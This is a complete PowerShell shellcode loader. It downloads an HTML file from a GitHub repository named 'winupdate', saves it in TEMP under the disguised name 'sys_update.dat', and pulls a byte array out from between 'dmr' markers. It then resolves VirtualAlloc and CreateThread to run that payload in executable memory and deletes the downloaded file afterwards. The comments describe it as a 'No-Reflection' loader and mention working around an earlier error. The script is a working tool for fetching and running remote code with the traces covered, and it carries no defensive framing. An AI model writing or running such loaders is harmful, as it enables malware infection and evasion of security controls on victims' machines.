# 1. Setup Paths
$htmlPath = "$env:TEMP\sys_update.dat"
$htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"

# 2. Download
Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing

# 3. Reassemble Byte Array
$htmlContent = Get-Content $htmlPath -Raw
$pattern = '(?<=dmr)(.*?)(?=dmr)'
$match = [regex]::Match($htmlContent, $pattern).Value
$byteArray = $match.Split("dmr") | Where-Object { $_ -ne "" } | ForEach-Object { [byte]$_ }

# 4. The "No-Reflection" Loader
# We use the built-in Win32 method for dynamic loading
$msvcrt = [Runtime.InteropServices.NativeLibrary]::Load("kernel32.dll")
$vAllocAddr = [Runtime.InteropServices.NativeLibrary]::GetExport($msvcrt, "VirtualAlloc")
$cThreadAddr = [Runtime.InteropServices.NativeLibrary]::GetExport($msvcrt, "CreateThread")

# Create the delegates (pointers to the functions)
# This uses a slightly different syntax to avoid the 'overload' error you saw
$DelegateVirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vAllocAddr, [Func[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
$DelegateCreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cThreadAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])

# 5. Allocate and Inject
$size = [uint32]$byteArray.Length
# 0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
$address = $DelegateVirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)

if ($address -ne [IntPtr]::Zero) {
    [System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $size)
    
    # Start the shellcode in a background thread
    $DelegateCreateThread.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
    
    Write-Host "Success: Shellcode running in background."
    # Keep the script alive for 5 seconds to let the thread initialize
    Start-Sleep -Seconds 5
}

# 6. Cleanup
Remove-Item $htmlPath -Force
